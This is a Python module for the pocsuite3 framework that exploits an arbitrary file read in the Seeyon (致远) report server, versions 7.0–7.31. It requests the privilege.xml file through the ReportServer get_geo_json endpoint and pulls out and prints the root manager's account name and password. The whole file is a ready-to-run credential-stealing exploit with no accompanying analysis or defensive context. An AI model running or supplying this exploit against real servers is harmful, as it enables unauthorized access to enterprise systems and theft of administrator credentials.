from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '致远报表密码泄露'
    appName = '致远'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''致远报表任意文件读取造成的密码泄露（采用了帆软报表）'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
            r = requests.get(url=target,timeout=5,verify=False)
            if r.status_code == 200 and "rootManagerPassword" in r.text:
                match = re.findall(r'<!\[CDATA\[(.*?)\]\]><', r.text, re.I|re.M)
                print("账号："+match[0]+"密码:"+match[1])
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['payload'] = "/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
                return self.parse_output(result)
        except Exception as e:
            print(e)
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)